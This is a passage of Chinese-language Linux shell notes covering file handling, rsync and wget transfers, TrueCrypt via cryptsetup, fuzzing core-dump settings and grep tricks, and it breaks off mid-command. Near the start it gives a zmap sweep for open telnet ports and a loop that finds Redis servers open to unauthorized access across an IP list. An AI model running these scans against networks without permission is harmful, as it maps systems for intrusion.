#\u9700\u8981\u5148\u7f16\u8f91\u9ed1\u540d\u5355 vi /etc/zmap/blacklist.conf \u53d6\u6d88\u6389\u6ce8\u91ca zmap 192.168.0.0/16 -B1000M -i eth0 -g -T 4 -p 23 -o 23.txt \u5176\u4e2d -g \u8868\u793a\u626b\u63cf\u7ed3\u675f\u540e\u663e\u793a\u603b\u7ed3\uff0c -T 4 \u8868\u793a\u542f\u52a84\u4e2a\u626b\u63cf\u7ebf\u7a0b\uff0c -p 23 \u8868\u793a\u626b\u63cf23\u7aef\u53e3\uff0c-o\u4fdd\u5b58\u6587\u4ef6\u7684\u540d\u79f0 \u5982\u679c\u62e8\u53f7\u4e86vpn\uff0c\u9700\u8981\u7528-G\u6307\u5b9a\u7f51\u5173\u7684MAC\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7 arp \u7f51\u5173\u7684IP \u5f97\u5230 \u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e \u00b6 for i in `cat iplist.txt`; do (if [ `echo PING|redis-cli -h $i` == \"PONG\" ] ;then echo $i;fi);done 2>/dev/null \u5229\u7528\u4e86bash\u652f\u6301\u7684for\u8bed\u53e5\uff0c\u6ce8\u610ffor\u4e4b\u540e\u7684\u5206\u53f7\u548c\u6700\u540e\u7684done \u8fd8\u6709\u7528\u4e86if\u5b57\u7b26\u4e32\u76f8\u7b49\uff0c\u8bb0\u5f97\u8981\u7528fi\u7ed3\u675fif redis-cli\u8fde\u63a5\u4e0a\u670d\u52a1\u5668\u540e\u53d1\u9001PING\uff0c\u5982\u679c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5219\u4f1a\u8fd4\u56dePONG\uff0c\u5426\u5219\u4f1a\u8981\u6c42Auth\u6216\u8005\u5176\u4ed6\u62a5\u9519\u4fe1\u606f \u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a \u00b6 \u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install -y imagemagick \u5904\u7406\u4e00\u5f20\u56fe\u7247in.png\uff0c\u88c1\u526a\u6210300x280\u5927\u5c0f\uff0c\u4ece(30,0)\u4f5c\u4e3a\u88c1\u526a\u7684\u5de6\u4e0a\u89d2\u70b9\uff0c\u5f97\u5230out.png\uff1a convert in.png -crop 300x280+30+0 out.png \u5176\u5b9e\u8fd9\u56db\u4e2a\u53c2\u6570\u662f\u6211\u53cd\u590d\u5c1d\u8bd5\u4e8c\u5206\u6cd5\u5f97\u5230\u7684\uff0c\u6216\u8bb8\u53ef\u4ee5\u7528\u4e13\u4e1a\u8f6f\u4ef6\u5feb\u901f\u5f97\u5230\u5427 \u5173\u952e\u662f\u53ef\u4ee5\u6279\u91cf\u5904\u7406\u5440\uff0c\u8fd9\u91cc\u4e0b\u8f7dfriends\u7684\u5934\u50cf\u56fe\u7247\u8fdb\u884c\u5904\u7406\uff1a for i in { 1. . 79 }; do curl - o $ i . png http : // kemono - friends . jp / wp - content / uploads / 2016 / 11 / no ` printf \" %03d \" $ i ` . png -- proxy socks5 : // 127.0 . 0.1 : 1080 ; done for i in { 1. . 79 }; do convert $ i . png - crop 300 x280 + 30 + 0 $ i . png ; done \u5176\u4e2d\u4f7f\u7528\u4e86printf\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u5f971\u53d8\u6210\u4eba\u5bb6url\u9700\u8981\u7684001 \u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664 \u00b6 find . -size 0 -delete \u67e5\u627e\u5927\u4e8e100M\u7684\u6587\u4ef6\uff1a find . -size +100M \u6279\u91cf\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d \u00b6 \u5c06\u5f53\u524d\u76ee\u5f55\u4e0b(\u5305\u542b\u5b50\u76ee\u5f55)\u6240\u6709\u7684txt\u6587\u4ef6\u6539\u4e3a.newext\u540e\u7f00\uff1a find . -name \"*.txt\" -exec rename 's/.txt$/.newext/' {} \\; \u5982\u679ccurl\u4e0b\u8f7d\u7684\u65f6\u5019\u5141\u8bb8gzip\u4f46\u5fd8\u4e86\u2013compressed\u5f97\u5230\u7684\u6587\u4ef6\u662fgzip\u538b\u7f29\u7684\uff0c\u4fee\u6539\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.txt\u4e3a.txt.gz\uff0c\u7136\u540e\u89e3\u538b\u7f29\uff1a\u5176\u4e2drename -v\u8868\u793a\u663e\u793a\u4fee\u6539\u7684\u5217\u8868 rename -v 's/.txt$/.txt.gz/' *.txt gunzip *.gz \u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26 \u00b6 \u7528vim\u6253\u5f00\u6587\u4ef6\u540e\uff0c\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u5192\u53f7\u4e5f\u662f\u9700\u8981\u6309\u7684 :set ff=unix :wq \u4e0d\u7528free\u67e5\u770b\u5185\u5b58\u5360\u7528 \u00b6 \u5728docker\u5bb9\u5668\u5185\u90e8\u4e00\u822c\u662f\u4e0d\u80fd\u901a\u8fc7 free -h \u6765\u67e5\u770b\u771f\u5b9e\u5360\u7528\u7684\u5185\u5b58\u7684\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u91c7\u7528 ps aux \u7d2f\u52a0RSS\u5b57\u6bb5\u6765\u4f30\u8ba1\uff1a ps aux | awk '{sum+=$6} END {print sum / 1024}' watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa \u00b6 \u4f8b\u5982\u6211\u60f3\u6301\u7eed\u67e5\u770boutput.txt\u6587\u4ef6\u5927\u5c0f\uff1a watch -n 1 ls -l output.txt \u5176\u4e2d -n 1 \u8868\u793a\u6bcf\u96941s\u5237\u65b0\u4e00\u6b21 \u8fd9\u4e2a\u547d\u4ee4\u7b49\u4ef7\u4e8e\u81ea\u5df1\u5199\u4e2abash\u811a\u672c\uff1a 1 2 3 4 5 6 7 #! /bin/bash while [ 1 ] do # do your work here... sleep 1 clear done \u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1 \u00b6 \u53c2\u7167 http://davidstutz.de/installing-truecrypt-raspbian/ \uff0c\u4e00\u6b65\u6b65\u6765\u5c31\u884c\u5566 \u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff0c\u5176\u4e2dmake\u4f7f\u7528\u53c2\u6570 -j5 -l4 \u8868\u793a\u540c\u65f6\u6267\u884c5\u4e2a\u7f16\u8bd1\u4f46\u9650\u5236\u7cfb\u7edf\u8d1f\u8f7d<4\uff08\u56e0\u4e3a\u7f16\u8bd1\u8fc7\u7a0b\u5f88\u6162\uff0c\u76f4\u63a5make\u53ea\u4f1a\u4f7f\u75281\u4e2aCPU\uff0c\u8fd9\u6837\u8bbe\u7f6e\u540e\u53ef\u4ee5\u5145\u5206\u5229\u7528\u6811\u8393\u6d3e4\u6838\u5fc3CPU\uff09\uff1a \u6d89\u53ca\u7684\u538b\u7f29\u5305 truecrypt-targz.zip \uff0c wxWidgets-2.8.11.zip \uff0c pkcs.zip apt - get install - y unzip build - essentials pkg - config gtk2 . 0 - dev libfuse - dev #\u7528unzip\u89e3\u538b\u538b\u7f29\u5305\uff0c\u90fd\u89e3\u538b\u5230/root\u4e0b\uff0c\u76ee\u5f55\u7ed3\u6784\uff1a # /root # | - truecrypt-targz # | - wxWidgets-2.8.11 # | - pkcs cd wxWidgets - 2.8 . 11 ./ configure make - j5 - l4 #\u7279\u522b\u6162\uff0c\u8010\u5fc3\u7b49\u5f85 make - j5 - l4 install cd ../ truecrypt - targz export PKCS11_INC =/ root / pkcs / make - j5 - l4 NOGUI = 1 WX_ROOT =/ root / wxWidgets - 2.8 . 11 wxbuild make - j5 - l4 NOGUI = 1 WXSTATIC = 1 Main / truecrypt -- version #\u8f93\u51faTrueCrypt 7.1a cp Main / truecrypt / usr / local / bin / \u4f60\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u7248\u672c truecrypt-armv7l scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20 \u00b6 \u6b63\u5728\u62f7\u8d1d\u76ee\u5f55\u7684\u65f6\u5019\u88ab\u4e2d\u65ad\u4e86\uff08\u4f8b\u5982mount.ntfs\u5361\u6b7b\uff09\uff0c\u800cscp\u4e0d\u80fd\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u3001\u53ea\u4f1a\u8986\u76d6\uff1b\u5982\u679c\u7528rsync\u5b8c\u5168\u65ad\u70b9\u7eed\u4f20\u4f3c\u4e4e\u4f1a\u6821\u9a8c\u6587\u4ef6\uff0c\u592a\u6162 \u65b9\u6cd5\u662f\uff1a\u5220\u6389\u4e2d\u65ad\u65f6\u6b63\u5728\u62f7\u8d1d\u7684\u4e0d\u5b8c\u6574\u6587\u4ef6\uff0c\u4f7f\u7528\u4e0b\u8ff0\u547d\u4ee4\u6765\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff1a \u5047\u8bbe\u8981\u628a\u8fdc\u7a0b\u76ee\u5f55/path/\u8fd9\u4e2a\u6587\u4ef6\u5939\u6574\u4e2a\u62f7\u8d1d\u5230/mnt/\u4e0b\uff08\u4e5f\u5c31\u662f\u5185\u5bb9\u62f7\u8d1d\u5230/mnt/path/\u4e0b\uff09 rsync --progress -v -au username@host:\"'/path'\" /mnt/ \u6ce8\u610f\u6e90\u8def\u5f84/path\u540e\u9762\u4e0d\u80fd\u6709/\uff0c\u5426\u5219rsync\u4e0d\u4f1a\u521b\u5efa/mnt/path\u8fd9\u4e2a\u6587\u4ef6\u5939\uff1b/path\u88ab\u4e24\u5c42\u5f15\u53f7\u5305\u56f4\u662f\u4e3a\u4e86\u652f\u6301\u542b\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u4e00\u5c42\u662f\u672c\u5730\u547d\u4ee4\uff0c\u8fdc\u7a0b\u76ee\u5f55\u4e5f\u8981\u4e00\u5c42 rsync\u7684 --progress -v \u53c2\u6570\u8868\u793a\u663e\u793a\u5f53\u524d\u8fdb\u5ea6\u548c\u66f4\u591a\u5185\u5bb9\uff0c -a \u8868\u793aarchive\u9012\u5f52\u5e76\u5c3d\u53ef\u80fd\u539f\u6837\u4fdd\u7559\u6240\u6709\u4fe1\u606f\uff0c -u \u8868\u793a\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6 \u67e5\u770bman\u6587\u6863 explainshell.com \u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09 \u00b6 \u5728\u5185\u7f51\u4f20\u8f93\u975e\u654f\u611f\u6570\u636e\u65f6\uff0c\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528scp\uff08\u57fa\u4e8essh\uff09\u7684\u5b89\u5168\u4f20\u8f93\uff0c\u5c24\u5176\u662f\u6811\u8393\u6d3e\u8fd9\u79cd\u8ba1\u7b97\u6027\u80fd\u6709\u9650\u7684\u60c5\u5f62\u3002\u4f7f\u7528HTTP\u80fd\u6709\u6548\u52a0\u901f\u4f20\u8f93\u8fc7\u7a0b\uff0c\u4e14\u90e8\u7f72\u7b80\u5355\uff0c\u76f8\u6bd4\u914d\u7f6e\u590d\u6742\u7684vsftpd\u53ef\u4ee5\u8bf4\u662f\u5f88\u7b80\u5355\u4e86 \u670d\u52a1\u7aef\uff08\u6570\u636e\u4f20\u51fa\u7aef\uff09 \u00b6 \u4f7f\u7528nginx\u914d\u7f6e\u5141\u8bb8\u5217\u76ee\u5f55\u5373\u53ef\uff0c\u5728/etc/nginx/sites-enabled/\u4e0b\u6dfb\u52a0\u4e00\u4e2a\u6587\u4ef6\uff1a server{ listen 8080; root /path/to/your/dir; autoindex on; autoindex_exact_size off; autoindex_localtime on; } \u5982\u679c\u4f60\u4e0d\u5177\u6709root\u6743\u9650\uff0c\u53ef\u4ee5\u590d\u5236\u4e00\u4efdnginx.conf\uff0c\u4fee\u6539\u5176\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u4f60\u6ca1\u6709\u6743\u9650\u4fee\u6539\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4f8b\u5982access_log\uff0c\u7136\u540e\u4f7f\u7528 nginx -c /home/yourname/nginx.conf \uff08\u6ce8\u610f\u5fc5\u987b\u7edd\u5bf9\u8def\u5f84\uff09\u542f\u52a8\u4f60\u7684nginx\uff0c\u6ca1\u6709\u51fa\u73b0EMRG\u9519\u8bef\u5373\u4e3a\u542f\u52a8\u6210\u529f\uff08\u53ef\u4ee5\u4f7f\u7528netstat -pant\u89c2\u5bdf\u662f\u5426\u6210\u529f\u76d1\u542c\u7aef\u53e3\uff09 \u5ba2\u6237\u7aef\uff08\u6570\u636e\u4f20\u5165\u7aef\uff09\uff0c\u4f7f\u7528wget\uff1a \u00b6 alias myget='wget -r -np -nH -R index.html --restrict-file-names=nocontrol -p -N -l0 -e robots=off --read-timeout=20 --tries=0' cd /mnt #\u4e0b\u8f7d\u5230\u54ea myget http://server_IP:8080/yourdir #\u76f8\u5f53\u4e8e\u5c06yourdir\u590d\u5236\u5230\u5f53\u524d\u6587\u4ef6\u5939 \u53c2\u6570\u8bf4\u660e\uff1a -r \u9012\u5f52\u4e0b\u8f7d\uff0c-np\u4e0d\u8981\u8fdb\u5165\u7236\u76ee\u5f55\uff0c-nH\u4e0d\u8981\u521b\u5efahost\u6587\u4ef6\u5939\uff0c-R index.html\u4e0d\u8981\u4fdd\u5b58\u6587\u4ef6\u5217\u8868\u7684index.html\uff0c\u2013restrict-file-names=nocontrol\u4e0d\u8981\u4e71\u6539\u4e2d\u6587\u6587\u4ef6\u540d -p \u8981\u4e0b\u8f7d\u56fe\u7247\uff0c-N \u4f7f\u7528\u6d4f\u89c8\u5668304\u7684\u65b9\u5f0f\u907f\u514d\u91cd\u590d\u4e0b\u8f7d\uff0c-l0\u9012\u5f52\u5c42\u6570\u4e0d\u9650\u5236\uff0c-e robots=off\u4e0d\u68c0\u67e5robots.txt \u2013read-timeout=20 \u5982\u679c20s\u4e4b\u5185\u6ca1\u6709\u6570\u636e\u4f20\u8f93\u5219\u8ba4\u4e3a\u5931\u8d25\u8fdb\u884c\u91cd\u8bd5\uff0c\u2013tries=0\u65e0\u9650\u6b21\u91cd\u8bd5 \u67e5\u770bman\u6587\u6863 \u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b \u00b6 \u5982\u679c\u4f60\u53d1\u73b0ps aux\u6216netstat -pant\u8f93\u51fa\u4e86\u5927\u91cfsshd\u7684\u4fe1\u606f\uff0c\u8bf4\u660e\u4e4b\u524dssh\u8fde\u63a5\u65ad\u5f00\u540esshd\u5e76\u6ca1\u6709\u9000\u51fa\u800c\u662f\u4e00\u76f4\u5360\u7528\u5185\u5b58 \u6211\u4eec\u53ef\u4ee5\u6e05\u9664\u6389\u8fd9\u4e9b\u8fdb\u7a0b\u6765\u91ca\u653e\u5185\u5b58 \u9996\u5148\u901a\u8fc7 pstree -p \u6765\u67e5\u770b\u5f53\u524d\u4f60\u7684ssh\u4f1a\u8bdd\u7684sshd\u8fdb\u7a0bPID\uff0c\u4f8b\u5982\u8f93\u51fa\u4e86\u8fd9\u6837\u4e00\u884c\uff1a \u251c\u2500sshd(32275)\u2500\u2500\u2500bash(32413)\u2500\u2500\u2500pstree(6543) \u5219\u8bf4\u660e\u5f53\u524dsshd\u7684pid\u4e3a32275\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u6765kill -9\u5176\u4ed6\u6240\u6709\u7684sshd\u8fdb\u7a0b\uff1a ps -ef | grep sshd | grep -v 32275 | grep -v grep | awk '{print \"kill -9\", $2}' |sh Hint: \u5982\u679c\u5f53\u524d\u4e3b\u673a\u8fd8\u8fd0\u884c\u7740Docker\u5bb9\u5668\uff0c\u5982\u679c\u5bb9\u5668\u7684\u5b88\u62a4\u8fdb\u7a0b\u662fsshd\uff0c\u4e0a\u4e00\u6761\u547d\u4ee4\u53ef\u80fd\u4f7f\u5bb9\u5668\u9000\u51fa\uff1b\u6240\u4ee5\u4f60\u8fd8\u9700\u8981 docker top \u6765\u786e\u5b9a\u5bb9\u5668\u7684sshd\u5728\u4e3b\u673a\u4e0a\u7684pid\u53f7 \u6279\u91cf\u66ff\u6362\u6587\u672c \u00b6 \u4f8b\u5982\u6279\u91cf\u9012\u5f52\u66ff\u6362\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6240\u6709php\u6587\u4ef6\uff0c\u5c06\u5176\u4e2d\u7684\u201daha/666\u201d\u6539\u4e3a\u201dovo/999\u201d \u547d\u4ee4\u5982\u4e0b\uff1a find . -type f -name \"*.php\" -exec sed -i 's~aha/666~ovo/999~g' {} + \u5176\u4e2dsed -i\u539f\u4f4d\u66ff\u6362\u7528\u7684\u5206\u9694\u7b26\u7531\u4e8e\u66ff\u6362\u524d\u540e\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u4e86/\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u7ecf\u5178\u7684/\uff0c\u800c\u6539\u7528~ \u627e\u5230\u6700\u8fd1\u4fee\u6539\u7684\u6587\u4ef6 \u00b6 \u4f8b\u5982wget\u9012\u5f52\u4e0b\u8f7d\uff0c\u4e2d\u9014\u88ab\u4e2d\u65ad\u4e86\uff0c\u6062\u590d\u7684\u65f6\u5019\u4e0e\u5176\u6bcf\u4e2a\u6587\u4ef6\u90fd\u8bf7\u6c42\u4e00\u6b21\u4e0d\u5982\u76f4\u63a5\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6 \u90a3\u5c31\u9700\u8981\u627e\u5230\u4e2d\u65ad\u7684\u65f6\u5019\u6b63\u5728\u5199\u5165\u54ea\u4e2a\u6587\u4ef6\uff0c\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6\u7ee7\u7eed \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4ee5\u65f6\u95f4\u987a\u5e8f\u663e\u793a\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6587\u4ef6\uff0c\u65b0\u6587\u4ef6\u663e\u793a\u5728\u6700\u524d\u9762 find . -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort -r|less \u4f7f\u7528cryptsetup\u6302\u8f7dtruecrypt\u5206\u533a \u00b6 \u5728ubuntu 16.04\u4e2d\u7f16\u8bd1truecrypt 7.1a\u8fd0\u884c\u65f6\u51fa\u73b0\u9519\u8bef\uff1a error: Invalid characters encountered. \u5728\u8fd9\u4e2a\u94fe\u63a5\u4e0a\u627e\u5230\u4e86\u7b54\u6848\uff08\u611f\u8c22\u5728\u5176\u4ed6\u8bba\u575b\u627e\u5230\u7b54\u6848\u540e\u4e3b\u52a8\u63d0\u4f9b\u89e3\u51b3\u65b9\u6848\u7684Jakub Urbanowicz\uff09 https://bugs.archlinux.org/task/47325 \u539f\u8d34\u5730\u5740\uff08\u641c\u7d22cryptsetup\uff09\uff1ahttps://forums.gentoo.org/viewtopic-p-7809512.html \u65b9\u6cd5\u662f\uff1a sudo su # \u4ee5\u4e0b\u547d\u4ee4\u90fd\u8981 root\u6743\u9650 \uff0c\u5982\u679c\u5728 Docker\u5bb9\u5668\u4e2d\u5c1d\u8bd5 \u542f\u52a8\u5bb9\u5668\u65f6\u9700\u8981 --privileged # \u5148\u5b89\u88c5 cryptsetup apt install - y cryptsetup - bin # \u6302\u8f7d\uff0c\u6ce8\u610f type\u524d\u9762\u662f\u4e24\u4e2a\u6a2a\u7ebf \uff0c\u6587\u4ef6\u8def\u5f84\u53ef\u4ee5\u662f / dev / sdb1 \uff0c\u540d\u79f0\u968f\u4fbf\u586b cryptsetup open --type tcrypt truecrypt\u6587\u4ef6\u8def\u5f84 \u540d\u79f0 # \u7136\u540e mount\u6302\u8f7d mount / dev / mapper / \u540d\u79f0 \u6302\u8f7d\u70b9 # \u5378\u8f7d\u7684\u65f6\u5019\u8bb0\u5f97 close \uff0c\u90fd\u8fd8\u662f\u8981 root\u6743\u9650 umount \u6302\u8f7d\u70b9 cryptsetup close \u540d\u79f0 \u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5 \u00b6 \u7528binwalk\u53d1\u73b0\u9700\u8981\u7684\u7247\u6bb5\u7684\u8d77\u59cb\u4f4d\u70b9\uff0c\u4ee5\u53ca\u8ba1\u7b97\u51fa\u957f\u5ea6 binwalk\u76f4\u63a5-e\u6709\u65f6\u5019\u5c31\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u4f46\u5982\u679c\u662fexe\u6587\u4ef6 exe\u672c\u8eab\u53ef\u80fd\u88ab\u62c6\u6210\u591a\u4e2a\u6587\u4ef6 \u5982\u4e00\u5806\u8bc1\u4e66\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5 binwalk -D 'exe' \u6587\u4ef6\u540d \u6216\u8005\u7528dd\uff0c\u6ce8\u610f\u522b\u7528bs=1 \u592a\u6162\uff1a dd if=input.binary of=output.binary skip=$offset count=$bytes iflag=skip_bytes,count_bytes From: https://stackoverflow.com/questions/1423346/how-do-i-extract-a-single-chunk-of-bytes-from-within-a-file \u5982\u679c\u7701\u7565\u6389count\u5c31\u662f\u4e00\u76f4\u5230\u672b\u5c3e redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c \u00b6 FROM: https://stackoverflow.com/questions/4006324/how-to-atomically-delete-keys-matching-a-pattern-using-redis \u5220\u9664\u5f53\u524d\u6570\u636e\u5e93\u4e2dprefix\u5f00\u5934\u7684\u6240\u6709key\uff1a EVAL \"local keys = redis.call('keys', ARGV[1]) \\n for i=1,#keys,5000 do \\n redis.call('del', unpack(keys, i, math.min(i+4999, #keys))) \\n end \\n return keys\" 0 prefix* \u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9 \u00b6 \u4f7f\u7528 sed -i \u548c find \u4f8b\u5982\u672c\u7ad9\u7f16\u8bd1\u811a\u672c\u5728mkdocs\u7f16\u8bd1\u540e\u5bf9\u6240\u6709.html\u6587\u4ef6\u6267\u884c\u66ff\u6362\uff0c\u6539\u7528\u56fd\u5185CDN sed -i 's#cdnjs.cloudflare.com#cdnjs.loli.net#g' $(find -type f -name \"*.html\") sed -i 's#fonts.googleapis.com#fonts.loli.net#g' $(find -type f -name \"*.html\") coredump in fuzzing \u00b6 \u53c2\u8003\uff1a http://man7.org/linux/man-pages/man5/core.5.html \u4e3a\u5565afl\u8981\u6c42\u6211\u4eec echo core >/proc/sys/kernel/core_pattern \u5462\uff1f fuzzing\u65f6\u600e\u4e48\u907f\u514d\u4ea7\u751fcoredump\u4ea7\u751f\u5927\u91cfIO\u6d6a\u8d39\u65f6\u95f4\uff1f core_pattern\u662f\u5565 \u00b6 \u8fd9\u4e2a\u6587\u4ef6 /proc/sys/kernel/core_pattern \u662f\u547d\u540dcoredump\u6587\u4ef6\u7684\u6a21\u677f\uff0c\u6bd4\u5982\u6539\u4e3a core \u4e4b\u540e\u4ea7\u751f\u7684coredump\u6587\u4ef6\u5c31\u53eb\u505a core \u53e6\u4e00\u4e2a\u6587\u4ef6 /proc/sys/kernel/core_uses_pid \u5982\u679c\u662f1\u7684\u8bdd\uff0c\u8fd8\u4f1a\u52a0\u4e0a .pid \u600e\u4e48\u624d\u80fd\u4e0d\u4ea7\u751fcoredump \u00b6 \u5168\u5c40\u5173\u95ed\uff1a echo >/proc/sys/kernel/core_pattern echo 0 >/proc/sys/kernel/core_uses_pid \u8fd8\u53ef\u4ee5\u5728\u5f53\u524d\u76ee\u5f55 mkdir core \uff0c\u6709\u4e86\u540c\u540d\u6587\u4ef6\u5939\u5c31\u4e0d\u4f1a\u518d\u5199core\u6587\u4ef6\u4e86 fuzzer\u53ef\u4ee5\u7528rlimit\u7684\u529f\u80fd\u9650\u5236\u5b50\u8fdb\u7a0b\uff1a \u6587\u6863\u8bf4\u4e86 RLIMIT_CORE \u8fd9\u4e2a\u9650\u5236\uff0c\u53ea\u8981\u5b83\u662f0\u5c31\u4e0d\u4f1a\u4ea7\u751f\u4e86\uff0c\u6bd4\u5982 AFL\u7684\u4ee3\u7801 \uff1a /* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered before the dump is complete. */ r . rlim_max = r . rlim_cur = 0 ; setrlimit ( RLIMIT_CORE , & r ); /* Ignore errors */ \u518d\u6bd4\u5982 honggfuzz\u7684\u4ee3\u7801 \uff08honggfuzz-1.7\u5e76\u6ca1\u6709\u8003\u8651\u8fd9\u4e2a\uff09\uff1a /* in cmdline . c */ { { \"rlimit_core\" , required_argument , NULL , 0x103 }, \"Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])\" }, /* in subproc . c */ #ifdef RLIMIT_CORE const struct rlimit rl = { . rlim_cur = run -> global -> exe . coreLimit * 1024 ULL * 1024 ULL , . rlim_max = run -> global -> exe . coreLimit * 1024 ULL * 1024 ULL , }; if ( setrlimit ( RLIMIT_CORE , & rl ) == - 1 ) { PLOG_W ( \"Couldn't enforce the RLIMIT_CORE resource limit, ignoring\" ); } #endif /* ifdef RLIMIT_CORE */ bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386 \u00b6 shuf filename|while read line; do python3 run.py \"$line\"; done grep\u67e5\u627e\u4e2d\u6587 \u00b6 ls /tmp/test | grep -P '[\\p{Han}]' \u53c2\u8003 https://www.regular-expressions.info/unicode.html#script grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9 \u00b6 \u573a\u666f\uff1afuzzing lava \u6d4b\u8bd5\u96c6\uff0c\u505a\u4e8630\u6b21\u91cd\u590d\uff08\u6bcf\u6b21\u91cd\u590d\u6587\u4ef6\u5939\u540d\u79f0\u672b\u5c3e\u4e3a _\u91cd\u590d \uff09\uff0c\u5df2\u7ecf\u5c06crash\u8fd0\u884c\u5f97\u5230\u7684stdout\u548cstderr\u5b58\u50a8\u4e3a\u6587\u4ef6\uff0c\u60f3\u7edf\u8ba1\u6bcf\u6b21\u91cd\u590d\u89e6\u53d1\u4e86\u591a\u5c11bugid \u6362\u53e5\u8bdd\u8bf4\uff0c\u5df2\u77e5\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6709\u4e00\u4e9b\u53ef\u80fd\u88ab\u5f53\u6210\u4e8c\u8fdb\u5236\u7684\u6587\u672c\u6587\u4ef6\uff0c\u5305\u542b Successfully triggered bug 576, crashing now! \uff0c\u6211\u60f3\u5c06\u5176\u4e2d\u7684576\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5bf9\u6574\u4e2a\u6587\u4ef6\u5939\u8ba1\u6570 \u6ce8\u610fgrep\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u2013text\uff0c\u4e0d\u7136\u4f1a\u6f0f\u6389\u4e00\u4e9b\u6587\u4ef6 \u7528\u5230\u4e86grep\u7684\u6b63\u5219\u63d0\u53d6\uff0c\u524d\u7f6e\u5224\u65ad\u7528 (?<=\u6587\u672c) \uff0c\u540e\u7f6e\u5224\u65ad\u7528 (?=\u6587\u672c) \uff0c\u4f8b\u5982\u63d0\u53d6 aaa123bbb \u4e2d\u7684123\u5c31\u53ef\u4ee5\uff1a echo aaa123bbb|grep -P '(?<=aaa)\\d+(?=bbb)' -o \u5176\u4e2d -P \u8868\u793a\u6b63\u5219\u8bed\u6cd5\u4e3aPerl\uff0c -o \u8868\u793a\u53ea\u663e\u793a\u5339\u914d \u53c2\u8003\uff1a https://unix.stackexchange.com/questions/13466/can-grep-output-only-specified-groupings-that-match for i in `seq 1 1 30`; do if [ -d *_ ${ i } / ]; then (cd *_ ${ i } ; echo $i `grep 'Successfully triggered bug' -r . --text \\ | grep -P '(? < =bug )(\\d+)(?=,)' -o \\ |sort| uniq|wc -l` ); else echo ${ i } 0; fi; done \u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b \u00b6 \u5217\u4e3e\u6240\u6709\u8fdb\u7a0b\uff0c\u627e\u51fa\u5185\u5b58\u8d85\u8fc75%\u7684\uff0ckill\u6389 \u6ce8\u610f\u5230sort\u6bd4\u8f83\u6570\u5b57\u5927\u5c0f\u9700\u8981\u7528 -h \u6216\u8005 -V \uff0c\u5426\u5219\u4f1a\u51fa\u73b0 3>20 \u7684\u6bd4\u8f83\u7ed3\u679c\uff08\u5b57\u7b26\u4e32\u6bd4\u8f83\uff09 \u7531\u4e8e [ \"$num\" -gt 5 ] \u53ea\u652f\u6301num\u4e3a\u6574\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u7528bc\u4f5c\u6d6e\u70b9\u6570\u5927\u5c0f\u5224\u65ad\uff0c\u53c2\u8003\uff1a https://stackoverflow.com/questions/8654051/how-to-compare-two-floating-point-numbers-in-bash \u7528 grep -v \u8bbe\u7f6e\u767d\u540d\u5355\uff1adocker, perl while true; do LINE=$(ps aux|grep -v docker|grep -v perl|sort -k4 -h|tail -n 1); (( $( echo \"`echo ${ LINE } |awk '{print 